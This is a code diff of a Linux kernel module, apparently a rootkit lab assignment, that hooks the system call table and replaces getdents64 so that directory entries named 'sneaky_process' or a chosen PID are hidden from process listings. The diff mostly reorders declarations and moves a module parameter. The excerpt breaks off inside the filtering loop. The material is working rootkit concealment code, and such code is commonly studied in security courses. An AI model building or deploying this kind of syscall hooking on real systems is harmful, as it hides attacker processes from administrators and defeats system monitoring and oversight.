@@ -13,6 +13,12 @@
 
 #define PREFIX "sneaky_process"
 
+// for hiding the pid
+MODULE_LICENSE("GPL");
+static int sneaky_pid = 0;
+module_param(sneaky_pid, int, 0);
+MODULE_PARM_DESC(sneaky_pid, "PID of the sneaky process");
+
 //This is a pointer to the system call table
 static unsigned long *sys_call_table;
 
@@ -66,18 +72,13 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
 
 
 /*                             getdents64                               */
-struct linux_dirent64 {
-    u64        d_ino;
-    s64        d_off;
-    unsigned short d_reclen;
-    unsigned char  d_type;
-    char       d_name[];
-};
-// for hiding the pid
-MODULE_LICENSE("GPL");
-static int sneaky_pid = 0;
-module_param(sneaky_pid, int, 0);
-MODULE_PARM_DESC(sneaky_pid, "PID of the sneaky process");
+// struct linux_dirent64 {
+//     u64        d_ino;
+//     s64        d_off;
+//     unsigned short d_reclen;
+//     unsigned char  d_type;
+//     char       d_name[];
+// };
 
 
 asmlinkage int (*original_getdents64)(struct pt_regs *);
@@ -85,22 +86,27 @@ asmlinkage int (*original_getdents64)(struct pt_regs *);
 asmlinkage int sneaky_sys_getdents64(struct pt_regs * regs)
 {
   // stop and redefine the sys call of original_getdents64
-  unsigned int fd = regs->di;
-  struct linux_dirent64 *dirp = (struct linux_dirent64 *)regs->si;
-  unsigned int count = regs->dx;
+  struct linux_dirent64 * dirp = (struct linux_dirent64 *)regs->si;
+  char pid_str[10];
+  struct linux_dirent64 * d;
+  int bpos = 0;
+  int nread; 
+  snprintf(pid_str, sizeof(pid_str), "%d", sneaky_pid);
 
-  // snprintf(pid_str, sizeof(pid_str), "%d", sneaky_pid);
-
-  int nread = original_getdents64(regs);
+  // call the original getdents64
+  nread = original_getdents64(regs);
   if (nread <= 0) {
     return nread;
   }
 
+  // snprintf(pid_str, sizeof(pid_str), "%d", sneaky_pid);
+
+  // // int nread = original_getdents64(regs);
+  // if (nread <= 0) {
+  //   return nread;
+  // }
+
   // use loop to check and hide the pid of sneaky process
-  struct linux_dirent64 *d;
-  int bpos = 0;
-  char pid_str[10];
-  snprintf(pid_str, sizeof(pid_str), "%d", sneaky_pid);
   for (; bpos < nread;) {
     d = (struct linux_dirent64 *)((char *)dirp + bpos);
     if (strcmp(d->d_name, "sneaky_process") == 0 || strcmp(d->d_name, pid_str) == 0) {
